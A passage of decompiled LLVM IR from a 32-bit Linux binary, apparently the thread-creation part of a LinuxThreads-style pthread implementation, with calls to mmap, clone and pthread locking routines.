  %v0_804b942 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b942 = load i32, i32* @esp, align 4
  %v2_804b942 = add i32 %v1_804b942, 12
  %v3_804b942 = inttoptr i32 %v2_804b942 to i32*
  store i32 %v0_804b942, i32* %v3_804b942, align 4
  %v0_804b946 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b946 = load i32, i32* @esp, align 4
  %v2_804b946 = add i32 %v1_804b946, -4
  %v3_804b946 = inttoptr i32 %v2_804b946 to i32*
  store i32 %v0_804b946, i32* %v3_804b946, align 4
  %v0_804b947 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b947 = add i32 %v1_804b946, -8
  %v3_804b947 = inttoptr i32 %v2_804b947 to i32*
  store i32 %v0_804b947, i32* %v3_804b947, align 4
  %v1_804b948 = add i32 %v1_804b946, -12
  %v2_804b948 = inttoptr i32 %v1_804b948 to i32*
  store i32 0, i32* %v2_804b948, align 4
  %v1_804b94a = add i32 %v1_804b946, -16
  %v2_804b94a = inttoptr i32 %v1_804b94a to i32*
  store i32 -1, i32* %v2_804b94a, align 4
  %v1_804b94c = add i32 %v1_804b946, -20
  %v2_804b94c = inttoptr i32 %v1_804b94c to i32*
  store i32 16, i32* %v2_804b94c, align 4
  %v1_804b94e = add i32 %v1_804b946, -24
  %v2_804b94e = inttoptr i32 %v1_804b94e to i32*
  store i32 0, i32* %v2_804b94e, align 4
  %v0_804b950 = load i32, i32* %eax.global-to-local, align 4
  %v2_804b950 = add i32 %v1_804b946, -28
  %v3_804b950 = inttoptr i32 %v2_804b950 to i32*
  store i32 %v0_804b950, i32* %v3_804b950, align 4
  %v0_804b951 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b951 = add i32 %v1_804b946, -32
  %v3_804b951 = inttoptr i32 %v2_804b951 to i32*
  store i32 %v0_804b951, i32* %v3_804b951, align 4
  %v2_804b952 = load i32, i32* %stack_var_-16, align 4
  %v9_804b952 = call i32 @mmap(i32 %arg1, i32 1, i32 %v2_804b952, i32 %v0_804b6cf, i32 %v0_804b6ce, i32 %v0_804b6cd, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804b957 = load i32, i32* @esp, align 4
  %v1_804b957 = add i32 %v0_804b957, 32
  %v1_804b95a = add i32 %v9_804b952, 1
  %v8_804b95a = icmp eq i32 %v1_804b95a, 0
  store i32 %v1_804b95a, i32* %eax.global-to-local, align 4
  %v1_804b95b = icmp eq i1 %v8_804b95a, false
  br i1 %v1_804b95b, label %dec_label_pc_804b978, label %dec_label_pc_804b95d

dec_label_pc_804b95d:                             ; preds = %dec_label_pc_804b937, %dec_label_pc_804b927, %dec_label_pc_804b8a0
  %v0_804b95d = phi i32 [ %v1_804b957, %dec_label_pc_804b937 ], [ %v1_804b921, %dec_label_pc_804b927 ], [ %v0_804b86e90, %dec_label_pc_804b8a0 ]
  %v1_804b95d = add i32 %v0_804b95d, 12
  %v2_804b95d = inttoptr i32 %v1_804b95d to i32*
  store i32 0, i32* %v2_804b95d, align 4
  %v0_804b965 = load i32, i32* @esp, align 4
  %v1_804b965 = add i32 %v0_804b965, 8
  %v2_804b965 = inttoptr i32 %v1_804b965 to i32*
  store i32 0, i32* %v2_804b965, align 4
  %v1_804b978.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b978

dec_label_pc_804b96f:                             ; preds = %dec_label_pc_804b8eb, %dec_label_pc_804b87c
  %v17_804b96f = phi i32 [ %v1_804b921, %dec_label_pc_804b8eb ], [ %v0_804b86e90, %dec_label_pc_804b87c ]
  %v1_804b96f = add i32 %v17_804b96f, 20
  %v2_804b96f = inttoptr i32 %v1_804b96f to i32*
  %v3_804b96f = load i32, i32* %v2_804b96f, align 4
  %v4_804b96f = add i32 %v3_804b96f, 1
  store i32 %v4_804b96f, i32* %v2_804b96f, align 4
  %v0_804b86e = load i32, i32* @esp, align 4
  %v1_804b86e = add i32 %v0_804b86e, 20
  %v2_804b86e = inttoptr i32 %v1_804b86e to i32*
  %v3_804b86e = load i32, i32* %v2_804b86e, align 4
  %tmp104 = icmp ult i32 %v3_804b86e, 1024
  br i1 %tmp104, label %dec_label_pc_804b87c, label %dec_label_pc_804bbec

dec_label_pc_804b978:                             ; preds = %dec_label_pc_804b937, %dec_label_pc_804b95d
  %v1_804b978 = phi i32 [ %v1_804b957, %dec_label_pc_804b937 ], [ %v1_804b978.pre, %dec_label_pc_804b95d ]
  %v0_804b978 = load i32, i32* @ebx, align 4
  %v2_804b978 = add i32 %v1_804b978, -4
  %v3_804b978 = inttoptr i32 %v2_804b978 to i32*
  store i32 %v0_804b978, i32* %v3_804b978, align 4
  %v1_804b979 = add i32 %v1_804b978, -8
  %v2_804b979 = inttoptr i32 %v1_804b979 to i32*
  store i32 480, i32* %v2_804b979, align 4
  %v1_804b97e = add i32 %v1_804b978, -12
  %v2_804b97e = inttoptr i32 %v1_804b97e to i32*
  store i32 0, i32* %v2_804b97e, align 4
  %v0_804b980 = load i32, i32* @esi, align 4
  %v2_804b980 = add i32 %v1_804b978, -16
  %v3_804b980 = inttoptr i32 %v2_804b980 to i32*
  store i32 %v0_804b980, i32* %v3_804b980, align 4
  %v2_804b981 = load i32, i32* %stack_var_-16, align 4
  %v5_804b981 = call i32 @__GI_memset(i8* %v4_804b981, i32 1, i32 %v2_804b981)
  %v0_804b986 = load i32, i32* @global_var_8062300.148, align 256
  %v1_804b98b = add i32 %v0_804b986, 1
  %v0_804b98c = load i32, i32* @esp, align 4
  store i32 %v1_804b98b, i32* @global_var_8062300.148, align 256
  %v0_804b994 = load i32, i32* @global_var_8062eac.158, align 4
  %v1_804b999 = add i32 %v0_804b994, 1024
  store i32 %v1_804b999, i32* %eax.global-to-local, align 4
  %v0_804b99e = load i32, i32* @esi, align 4
  store i32 %v0_804b99e, i32* @ebx, align 4
  store i32 %v1_804b999, i32* @global_var_8062eac.158, align 4
  %v2_804b9a5 = add i32 %v0_804b98c, 36
  %v3_804b9a5 = inttoptr i32 %v2_804b9a5 to i32*
  %v4_804b9a5 = load i32, i32* %v3_804b9a5, align 4
  %v5_804b9a5 = add i32 %v4_804b9a5, %v1_804b999
  store i32 %v5_804b9a5, i32* %eax.global-to-local, align 4
  %v2_804b9a9 = add i32 %v0_804b98c, 32
  %v3_804b9a9 = inttoptr i32 %v2_804b9a9 to i32*
  store i32 %v5_804b9a5, i32* %v3_804b9a9, align 4
  %v0_804b9ad = load i32, i32* %eax.global-to-local, align 4
  %v1_804b9ad = load i32, i32* @esi, align 4
  %v2_804b9ad = add i32 %v1_804b9ad, 16
  %v3_804b9ad = inttoptr i32 %v2_804b9ad to i32*
  store i32 %v0_804b9ad, i32* %v3_804b9ad, align 4
  %v0_804b9b0 = load i32, i32* @esp, align 4
  %v1_804b9b0 = add i32 %v0_804b9b0, 20
  %v2_804b9b0 = inttoptr i32 %v1_804b9b0 to i32*
  %v3_804b9b0 = load i32, i32* %v2_804b9b0, align 4
  %v0_804b9b4 = load i32, i32* @esi, align 4
  %v1_804b9b4 = add i32 %v0_804b9b4, 72
  %v2_804b9b7 = mul i32 %v3_804b9b0, 16
  store i32 %v2_804b9b7, i32* %edx.global-to-local, align 4
  %v2_804b9ba = add i32 %v0_804b9b4, 68
  %v3_804b9ba = inttoptr i32 %v2_804b9ba to i32*
  store i32 %v1_804b9b4, i32* %v3_804b9ba, align 4
  %v0_804b9bd = load i32, i32* @esi, align 4
  %v1_804b9bd = add i32 %v0_804b9bd, 80
  store i32 %v1_804b9bd, i32* %eax.global-to-local, align 4
  %v1_804b9c0 = add i32 %v0_804b9bd, 64
  %v2_804b9c0 = inttoptr i32 %v1_804b9c0 to i8*
  store i8 0, i8* %v2_804b9c0, align 1
  %v0_804b9c4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b9c4 = add i32 %v0_804b9c4, 134603520
  store i32 %v1_804b9c4, i32* %ecx.global-to-local, align 4
  %v0_804b9ca = load i32, i32* @esi, align 4
  %v1_804b9ca = add i32 %v0_804b9ca, 65
  %v2_804b9ca = inttoptr i32 %v1_804b9ca to i8*
  store i8 0, i8* %v2_804b9ca, align 1
  %v0_804b9ce = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b9ce = load i32, i32* @esi, align 4
  %v2_804b9ce = add i32 %v1_804b9ce, 28
  %v3_804b9ce = inttoptr i32 %v2_804b9ce to i32*
  store i32 %v0_804b9ce, i32* %v3_804b9ce, align 4
  %v0_804b9d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b9d1 = load i32, i32* @esi, align 4
  %v2_804b9d1 = add i32 %v1_804b9d1, 76
  %v3_804b9d1 = inttoptr i32 %v2_804b9d1 to i32*
  store i32 %v0_804b9d1, i32* %v3_804b9d1, align 4
  %v0_804b9d4 = load i32, i32* @esp, align 4
  %v1_804b9d4 = add i32 %v0_804b9d4, 12
  %v2_804b9d4 = inttoptr i32 %v1_804b9d4 to i32*
  %v3_804b9d4 = load i32, i32* %v2_804b9d4, align 4
  store i32 %v3_804b9d4, i32* %eax.global-to-local, align 4
  %v0_804b9d8 = load i32, i32* @edi, align 4
  %v1_804b9d8 = icmp eq i32 %v0_804b9d8, 0
  %v1_804b9da = load i32, i32* @esi, align 4
  %v2_804b9da = add i32 %v1_804b9da, 396
  %v3_804b9da = inttoptr i32 %v2_804b9da to i32*
  store i32 %v3_804b9d4, i32* %v3_804b9da, align 4
  %v0_804b9e0 = load i32, i32* @esp, align 4
  %v1_804b9e0 = add i32 %v0_804b9e0, 8
  %v2_804b9e0 = inttoptr i32 %v1_804b9e0 to i32*
  %v3_804b9e0 = load i32, i32* %v2_804b9e0, align 4
  store i32 %v3_804b9e0, i32* %eax.global-to-local, align 4
  %v0_804b9e4 = load i32, i32* @esi, align 4
  %v1_804b9e4 = load i32, i32* @ebx, align 4
  %v2_804b9e4 = add i32 %v1_804b9e4, 404
  %v3_804b9e4 = inttoptr i32 %v2_804b9e4 to i32*
  store i32 %v0_804b9e4, i32* %v3_804b9e4, align 4
  %v0_804b9ea = load i32, i32* %eax.global-to-local, align 4
  %v1_804b9ea = load i32, i32* @esi, align 4
  %v2_804b9ea = add i32 %v1_804b9ea, 400
  %v3_804b9ea = inttoptr i32 %v2_804b9ea to i32*
  store i32 %v0_804b9ea, i32* %v3_804b9ea, align 4
  %v0_804b9f0 = load i32, i32* @esp, align 4
  %v1_804b9f0 = add i32 %v0_804b9f0, 20
  %v2_804b9f0 = inttoptr i32 %v1_804b9f0 to i32*
  %v3_804b9f0 = load i32, i32* %v2_804b9f0, align 4
  store i32 %v3_804b9f0, i32* %eax.global-to-local, align 4
  %v1_804b9f4 = load i32, i32* @esi, align 4
  %v2_804b9f4 = add i32 %v1_804b9f4, 408
  %v3_804b9f4 = inttoptr i32 %v2_804b9f4 to i32*
  store i32 %v3_804b9f0, i32* %v3_804b9f4, align 4
  %v0_804b9fa = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b9fa = add i32 %v0_804b9fa, 4
  %v2_804b9fa = inttoptr i32 %v1_804b9fa to i32*
  store i32 0, i32* %v2_804b9fa, align 4
  %v0_804ba01 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ba01 = add i32 %v0_804ba01, 134603520
  %v2_804ba01 = inttoptr i32 %v1_804ba01 to i32*
  store i32 0, i32* %v2_804ba01, align 4
  %v0_804ba0b = load i32, i32* @esi, align 4
  %v1_804ba0b = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba0b = add i32 %v1_804ba0b, 134603528
  %v3_804ba0b = inttoptr i32 %v2_804ba0b to i32*
  store i32 %v0_804ba0b, i32* %v3_804ba0b, align 4
  %v0_804ba11 = load i32, i32* @ebp, align 4
  %v1_804ba11 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ba11 = add i32 %v1_804ba11, 134603532
  %v3_804ba11 = inttoptr i32 %v2_804ba11 to i32*
  store i32 %v0_804ba11, i32* %v3_804ba11, align 4
  %v0_804ba17 = load i32, i32* @esi, align 4
  %v1_804ba17 = add i32 %v0_804ba17, 228
  %v2_804ba17 = inttoptr i32 %v1_804ba17 to i32*
  store i32 -1, i32* %v2_804ba17, align 4
  br i1 %v1_804b9d8, label %dec_label_pc_804ba89, label %dec_label_pc_804ba23

dec_label_pc_804ba23:                             ; preds = %dec_label_pc_804b978
  %v0_804ba23 = load i32, i32* @edi, align 4
  %v1_804ba23 = inttoptr i32 %v0_804ba23 to i32*
  %v2_804ba23 = load i32, i32* %v1_804ba23, align 4
  store i32 %v2_804ba23, i32* %eax.global-to-local, align 4
  %v1_804ba25 = trunc i32 %v2_804ba23 to i8
  %v2_804ba25 = load i32, i32* @esi, align 4
  %v3_804ba25 = add i32 %v2_804ba25, 45
  %v4_804ba25 = inttoptr i32 %v3_804ba25 to i8*
  store i8 %v1_804ba25, i8* %v4_804ba25, align 1
  %v0_804ba28 = load i32, i32* @edi, align 4
  %v1_804ba28 = add i32 %v0_804ba28, 24
  %v2_804ba28 = inttoptr i32 %v1_804ba28 to i32*
  %v3_804ba28 = load i32, i32* %v2_804ba28, align 4
  store i32 %v3_804ba28, i32* %eax.global-to-local, align 4
  %v1_804ba2b = load i32, i32* @esi, align 4
  %v2_804ba2b = add i32 %v1_804ba2b, 392
  %v3_804ba2b = inttoptr i32 %v2_804ba2b to i32*
  store i32 %v3_804ba28, i32* %v3_804ba2b, align 4
  %v0_804ba31 = load i32, i32* @edi, align 4
  %v1_804ba31 = add i32 %v0_804ba31, 12
  %v2_804ba31 = inttoptr i32 %v1_804ba31 to i32*
  %v3_804ba31 = load i32, i32* %v2_804ba31, align 4
  store i32 %v3_804ba31, i32* %eax.global-to-local, align 4
  %v1_804ba34 = icmp eq i32 %v3_804ba31, 0
  br i1 %v1_804ba34, label %dec_label_pc_804ba59, label %dec_label_pc_804ba38

dec_label_pc_804ba38:                             ; preds = %dec_label_pc_804ba23
  %v1_804ba38 = add i32 %v3_804ba31, -1
  %v8_804ba38 = icmp eq i32 %v1_804ba38, 0
  store i32 %v1_804ba38, i32* %eax.global-to-local, align 4
  %v1_804ba39 = icmp eq i1 %v8_804ba38, false
  br i1 %v1_804ba39, label %dec_label_pc_804ba80, label %dec_label_pc_804ba3b

dec_label_pc_804ba3b:                             ; preds = %dec_label_pc_804ba38
  %v1_804ba3b = add i32 %v0_804ba31, 4
  %v2_804ba3b = inttoptr i32 %v1_804ba3b to i32*
  %v3_804ba3b = load i32, i32* %v2_804ba3b, align 4
  %v1_804ba3e = load i32, i32* @esi, align 4
  %v2_804ba3e = add i32 %v1_804ba3e, 228
  %v3_804ba3e = inttoptr i32 %v2_804ba3e to i32*
  store i32 %v3_804ba3b, i32* %v3_804ba3e, align 4
  %v0_804ba44 = load i32, i32* @edi, align 4
  %v1_804ba44 = add i32 %v0_804ba44, 8
  store i32 %v1_804ba44, i32* %eax.global-to-local, align 4
  %v0_804ba47 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ba47 = load i32, i32* @esp, align 4
  %v2_804ba47 = add i32 %v1_804ba47, -4
  %v3_804ba47 = inttoptr i32 %v2_804ba47 to i32*
  store i32 %v0_804ba47, i32* %v3_804ba47, align 4
  %v1_804ba48 = add i32 %v1_804ba47, -8
  %v2_804ba48 = inttoptr i32 %v1_804ba48 to i32*
  store i32 4, i32* %v2_804ba48, align 4
  %v0_804ba4a = load i32, i32* %eax.global-to-local, align 4
  %v2_804ba4a = add i32 %v1_804ba47, -12
  %v3_804ba4a = inttoptr i32 %v2_804ba4a to i32*
  store i32 %v0_804ba4a, i32* %v3_804ba4a, align 4
  %v0_804ba4b = load i32, i32* @esi, align 4
  %v1_804ba4b = add i32 %v0_804ba4b, 232
  store i32 %v1_804ba4b, i32* %eax.global-to-local, align 4
  %v2_804ba51 = add i32 %v1_804ba47, -16
  %v3_804ba51 = inttoptr i32 %v2_804ba51 to i32*
  store i32 %v1_804ba4b, i32* %v3_804ba51, align 4
  %v2_804ba52 = load i32, i32* %stack_var_-16, align 4
  %v5_804ba52 = call i32 @memcpy(i16* %v4_804baa6, i32 1, i32 %v2_804ba52)
  br label %dec_label_pc_804ba7d

dec_label_pc_804ba59:                             ; preds = %dec_label_pc_804ba23
  %v0_804ba59 = load i32, i32* @esp, align 4
  %v1_804ba5c = add i32 %v0_804ba59, 28
  %v2_804ba5c = inttoptr i32 %v1_804ba5c to i32*
  %v3_804ba5c = load i32, i32* %v2_804ba5c, align 4
  %v5_804ba5c = add i32 %v0_804ba59, -16
  %v6_804ba5c = inttoptr i32 %v5_804ba5c to i32*
  store i32 %v3_804ba5c, i32* %v6_804ba5c, align 4
  %v1_804ba60 = call i32 @sched_getscheduler(i32 %arg1)
  %v1_804ba65 = load i32, i32* @esi, align 4
  %v2_804ba65 = add i32 %v1_804ba65, 228
  %v3_804ba65 = inttoptr i32 %v2_804ba65 to i32*
  store i32 %v1_804ba60, i32* %v3_804ba65, align 4
  %v0_804ba6b = load i32, i32* @esp, align 4
  %v1_804ba6b = inttoptr i32 %v0_804ba6b to i32*
  %v3_804ba6b = add i32 %v0_804ba6b, 4
  %v0_804ba6c = load i32, i32* @esi, align 4
  %v1_804ba6c = add i32 %v0_804ba6c, 232
  store i32 %v1_804ba6c, i32* %eax.global-to-local, align 4
  %v1_804ba72 = inttoptr i32 %v3_804ba6b to i32*
  %v2_804ba72 = load i32, i32* %v1_804ba72, align 4
  store i32 %v2_804ba72, i32* %edx.global-to-local, align 4
  store i32 %v1_804ba6c, i32* %v1_804ba72, align 4
  %v1_804ba74 = add i32 %v0_804ba6b, 44
  %v2_804ba74 = inttoptr i32 %v1_804ba74 to i32*
  %v3_804ba74 = load i32, i32* %v2_804ba74, align 4
  store i32 %v3_804ba74, i32* %v1_804ba6b, align 4
  %v2_804ba78 = load i32, i32* %stack_var_-16, align 4
  %v5_804ba78 = call i32 @sched_getparam(i32 %arg1, i32 1, i32 %v2_804ba78, i32 %v0_804b6cf)
  br label %dec_label_pc_804ba7d

dec_label_pc_804ba7d:                             ; preds = %dec_label_pc_804ba3b, %dec_label_pc_804ba59
  %storemerge2 = phi i32 [ %v5_804ba78, %dec_label_pc_804ba59 ], [ %v5_804ba52, %dec_label_pc_804ba3b ]
  store i32 %storemerge2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ba80

dec_label_pc_804ba80:                             ; preds = %dec_label_pc_804ba38, %dec_label_pc_804ba7d
  %v0_804ba80 = load i32, i32* @ebx, align 4
  %v1_804ba80 = add i32 %v0_804ba80, 232
  %v2_804ba80 = inttoptr i32 %v1_804ba80 to i32*
  %v3_804ba80 = load i32, i32* %v2_804ba80, align 4
  store i32 %v3_804ba80, i32* %eax.global-to-local, align 4
  %v2_804ba86 = add i32 %v0_804ba80, 24
  %v3_804ba86 = inttoptr i32 %v2_804ba86 to i32*
  store i32 %v3_804ba80, i32* %v3_804ba86, align 4
  br label %dec_label_pc_804ba89

dec_label_pc_804ba89:                             ; preds = %dec_label_pc_804b978, %dec_label_pc_804ba80
  %v0_804ba89 = load i32, i32* @esp, align 4
  %v1_804ba89 = add i32 %v0_804ba89, 36
  %v2_804ba89 = inttoptr i32 %v1_804ba89 to i32*
  %v3_804ba89 = load i32, i32* %v2_804ba89, align 4
  %v1_804ba8d = add i32 %v0_804ba89, 68
  store i32 %v1_804ba8d, i32* %eax.global-to-local, align 4
  %v1_804ba91 = load i32, i32* @ebx, align 4
  %v2_804ba91 = add i32 %v1_804ba91, 92
  %v3_804ba91 = inttoptr i32 %v2_804ba91 to i32*
  store i32 %v3_804ba89, i32* %v3_804ba91, align 4
  %v0_804ba94 = load i32, i32* @ebx, align 4
  %v1_804ba94 = add i32 %v0_804ba94, 100
  store i32 %v1_804ba94, i32* @edx, align 4
  %v0_804ba97 = load i32, i32* @esp, align 4
  %v1_804ba97 = add i32 %v0_804ba97, 32
  %v2_804ba97 = inttoptr i32 %v1_804ba97 to i32*
  %v3_804ba97 = load i32, i32* %v2_804ba97, align 4
  store i32 %v3_804ba97, i32* %ecx.global-to-local, align 4
  %v2_804ba9b = add i32 %v0_804ba94, 96
  %v3_804ba9b = inttoptr i32 %v2_804ba9b to i32*
  store i32 %v3_804ba97, i32* %v3_804ba9b, align 4
  %v0_804ba9e = load i32, i32* @ebp, align 4
  %v1_804ba9e = load i32, i32* @esp, align 4
  %v2_804ba9e = add i32 %v1_804ba9e, -4
  %v3_804ba9e = inttoptr i32 %v2_804ba9e to i32*
  store i32 %v0_804ba9e, i32* %v3_804ba9e, align 4
  %v1_804ba9f = add i32 %v1_804ba9e, -8
  %v2_804ba9f = inttoptr i32 %v1_804ba9f to i32*
  store i32 128, i32* %v2_804ba9f, align 4
  %v0_804baa4 = load i32, i32* %eax.global-to-local, align 4
  %v2_804baa4 = add i32 %v1_804ba9e, -12
  %v3_804baa4 = inttoptr i32 %v2_804baa4 to i32*
  store i32 %v0_804baa4, i32* %v3_804baa4, align 4
  %v0_804baa5 = load i32, i32* @edx, align 4
  %v2_804baa5 = add i32 %v1_804ba9e, -16
  %v3_804baa5 = inttoptr i32 %v2_804baa5 to i32*
  store i32 %v0_804baa5, i32* %v3_804baa5, align 4
  %v2_804baa6 = load i32, i32* %stack_var_-16, align 4
  %v5_804baa6 = call i32 @memcpy(i16* %v4_804baa6, i32 1, i32 %v2_804baa6)
  store i32 %v5_804baa6, i32* %eax.global-to-local, align 4
  %v0_804baab = load i32, i32* @esp, align 4
  %v1_804baab = inttoptr i32 %v0_804baab to i32*
  %v2_804baab = load i32, i32* %v1_804baab, align 4
  store i32 %v2_804baab, i32* @esi, align 4
  %v0_804baac = load i32, i32* @ebx, align 4
  %v1_804baac = add i32 %v0_804baac, 24
  %v2_804baac = inttoptr i32 %v1_804baac to i32*
  %v3_804baac = load i32, i32* %v2_804baac, align 4
  store i32 %v3_804baac, i32* %v1_804baab, align 4
  %v1_804baaf = call i32 @__pthread_manager_adjust_prio(i32 %arg1)
  %v0_804bab4 = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  %v1_804bab9 = load i32, i32* @ebx, align 4
  %v2_804bab9 = add i32 %v1_804bab9, 4
  %v3_804bab9 = inttoptr i32 %v2_804bab9 to i32*
  store i32 %v0_804bab4, i32* %v3_804bab9, align 4
  %v0_804babf = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  %v1_804bac6 = load i32, i32* @ebx, align 4
  %v2_804bac6 = inttoptr i32 %v1_804bac6 to i32*
  store i32 %v0_804babf, i32* %v2_804bac6, align 4
  %v0_804bac8 = load i32, i32* bitcast (i32** @global_var_80626e0.144 to i32*), align 32
  %v0_804bacf = load i32, i32* @ebx, align 4
  store i32 %v0_804bacf, i32* @global_var_80626e4.143, align 4
  store i32 %v0_804bac8, i32* %eax.global-to-local, align 4
  %v2_804bad7 = inttoptr i32 %v0_804bac8 to i32*
  store i32 %v0_804bacf, i32* %v2_804bad7, align 4
  %v0_804bad9 = load i32, i32* @esp, align 4
  %v1_804bad9 = add i32 %v0_804bad9, 24
  %v2_804bad9 = inttoptr i32 %v1_804bad9 to i32*
  %v3_804bad9 = load i32, i32* %v2_804bad9, align 4
  %v4_804bad9 = icmp eq i32 %v3_804bad9, 0
  br i1 %v4_804bad9, label %dec_label_pc_804bb4c, label %dec_label_pc_804bae0

dec_label_pc_804bae0:                             ; preds = %dec_label_pc_804ba89
  %v1_804bae0 = add i32 %v0_804bad9, 4
  %v2_804bae0 = inttoptr i32 %v1_804bae0 to i32*
  %v3_804bae0 = load i32, i32* %v2_804bae0, align 4
  store i32 %v3_804bae0, i32* %ecx.global-to-local, align 4
  %v0_804bae4 = load i32, i32* @global_var_8067654.149, align 4
  store i32 %v0_804bae4, i32* %eax.global-to-local, align 4
  %v1_804bae9 = add i32 %v3_804bae0, 416
  %v2_804bae9 = inttoptr i32 %v1_804bae9 to i8*
  %v3_804bae9 = load i8, i8* %v2_804bae9, align 1
  %v4_804bae9 = zext i8 %v3_804bae9 to i32
  %v5_804bae9 = load i32, i32* @edx, align 4
  %v6_804bae9 = and i32 %v5_804bae9, -256
  %v7_804bae9 = or i32 %v4_804bae9, %v0_804bae4
  %v3_804baef = trunc i32 %v7_804bae9 to i8
  %v5_804baef = icmp slt i8 %v3_804baef, 0
  %v9_804baef = urem i32 %v7_804bae9, 256
  %v12_804baef = or i32 %v9_804baef, %v6_804bae9
  store i32 %v12_804baef, i32* %edx.global-to-local, align 4
  %v1_804baf1 = icmp eq i1 %v5_804baef, false
  br i1 %v1_804baf1, label %dec_label_pc_804bb4c, label %dec_label_pc_804baf3

dec_label_pc_804baf3:                             ; preds = %dec_label_pc_804bae0
  store i32 0, i32* @edx, align 4
  %v0_804baf5 = load i32, i32* @ebx, align 4
  %v1_804baf5 = add i32 %v0_804baf5, 28
  %v2_804baf5 = inttoptr i32 %v1_804baf5 to i32*
  %v3_804baf5 = load i32, i32* %v2_804baf5, align 4
  store i32 %v3_804baf5, i32* @eax, align 4
  %v1_804baf8 = call i32 @__pthread_lock(i32 %arg1)
  %v0_804bafd = load i32, i32* @global_var_80626ec.155, align 4
  %v12_804bb02 = or i32 %v0_804bafd, 3840
  store i32 %v12_804bb02, i32* %eax.global-to-local, align 4
  %v0_804bb05 = load i32, i32* @ebx, align 4
  %v1_804bb05 = load i32, i32* @esp, align 4
  %v2_804bb05 = add i32 %v1_804bb05, -4
  %v3_804bb05 = inttoptr i32 %v2_804bb05 to i32*
  store i32 %v0_804bb05, i32* %v3_804bb05, align 4
  %v0_804bb06 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb06 = add i32 %v1_804bb05, -8
  %v3_804bb06 = inttoptr i32 %v2_804bb06 to i32*
  store i32 %v0_804bb06, i32* %v3_804bb06, align 4
  %v0_804bb07 = load i32, i32* @ebx, align 4
  %v2_804bb07 = add i32 %v1_804bb05, -12
  %v3_804bb07 = inttoptr i32 %v2_804bb07 to i32*
  store i32 %v0_804bb07, i32* %v3_804bb07, align 4
  %v1_804bb08 = add i32 %v1_804bb05, -16
  %v2_804bb08 = inttoptr i32 %v1_804bb08 to i32*
  store i32 134526173, i32* %v2_804bb08, align 4
  %v2_804bb0d = load i32, i32* %stack_var_-16, align 4
  %v5_804bb0d = call i32 @clone(i32 %arg1, i32 1, i32 %v2_804bb0d, i32 %v0_804b6cf)
  store i32 %v5_804bb0d, i32* @eax, align 4
  %v0_804bb12 = load i32, i32* @esp, align 4
  store i32 %v5_804bb0d, i32* @esi, align 4
  %v10_804bb17 = icmp eq i32 %v5_804bb0d, -1
  br i1 %v10_804bb17, label %dec_label_pc_804bb48, label %dec_label_pc_804bb1c

dec_label_pc_804bb1c:                             ; preds = %dec_label_pc_804baf3
  %v0_804bb1c = load i32, i32* @ebx, align 4
  %v2_804bb1c = add i32 %v0_804bb1c, 428
  %v3_804bb1c = inttoptr i32 %v2_804bb1c to i32*
  store i32 %v0_804bb1c, i32* %v3_804bb1c, align 4
  %v0_804bb22 = load i32, i32* @ebx, align 4
  %v1_804bb22 = add i32 %v0_804bb22, 424
  %v2_804bb22 = inttoptr i32 %v1_804bb22 to i32*
  store i32 8, i32* %v2_804bb22, align 4
  %v0_804bb2c = load i32, i32* @ebx, align 4
  store i32 %v0_804bb2c, i32* @global_var_806765c.150, align 4
  %v2_804bb32 = add i32 %v0_804bb2c, 20
  %v3_804bb32 = inttoptr i32 %v2_804bb32 to i32*
  store i32 %v5_804bb0d, i32* %v3_804bb32, align 4
  %v0_804bb35 = call i32 @__linuxthreads_create_event()
  store i32 %v0_804bb35, i32* %eax.global-to-local, align 4
  %v0_804bb3a = load i32, i32* @esp, align 4
  %v0_804bb3d = load i32, i32* @ebx, align 4
  %v1_804bb3d = add i32 %v0_804bb3d, 28
  %v2_804bb3d = inttoptr i32 %v1_804bb3d to i32*
  %v3_804bb3d = load i32, i32* %v2_804bb3d, align 4
  %v5_804bb3d = add i32 %v0_804bb3a, -16
  %v6_804bb3d = inttoptr i32 %v5_804bb3d to i32*
  store i32 %v3_804bb3d, i32* %v6_804bb3d, align 4
  %v2_804bb40 = call i32 @__pthread_unlock(i32* %v1_804bc5f)
  store i32 %v2_804bb40, i32* %eax.global-to-local, align 4
  %v0_804bb45 = load i32, i32* @esp, align 4
  %v0_804bb48.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804bb48

dec_label_pc_804bb48:                             ; preds = %dec_label_pc_804baf3, %dec_label_pc_804bb1c
  %v1_804bb5125.in = phi i32 [ %v0_804bb12, %dec_label_pc_804baf3 ], [ %v0_804bb45, %dec_label_pc_804bb1c ]
  %v0_804bb48 = phi i32 [ %v5_804bb0d, %dec_label_pc_804baf3 ], [ %v0_804bb48.pre, %dec_label_pc_804bb1c ]
  %v1_804bb5125 = add i32 %v1_804bb5125.in, 16
  %v1_804bb48 = icmp eq i32 %v0_804bb48, 0
  %v1_804bb4a = icmp eq i1 %v1_804bb48, false
  br i1 %v1_804bb4a, label %dec_label_pc_804bb66, label %dec_label_pc_804bb4c

dec_label_pc_804bb4c:                             ; preds = %dec_label_pc_804bb48, %dec_label_pc_804bae0, %dec_label_pc_804ba89
  %v1_804bb51 = phi i32 [ %v1_804bb5125, %dec_label_pc_804bb48 ], [ %v0_804bad9, %dec_label_pc_804bae0 ], [ %v0_804bad9, %dec_label_pc_804ba89 ]
  %v0_804bb4c = load i32, i32* @global_var_80626ec.155, align 4
  store i32 %v0_804bb4c, i32* %eax.global-to-local, align 4
  %v0_804bb51 = load i32, i32* @ebx, align 4
  %v2_804bb51 = add i32 %v1_804bb51, -4
  %v3_804bb51 = inttoptr i32 %v2_804bb51 to i32*
  store i32 %v0_804bb51, i32* %v3_804bb51, align 4
  %v0_804bb52 = load i32, i32* %eax.global-to-local, align 4
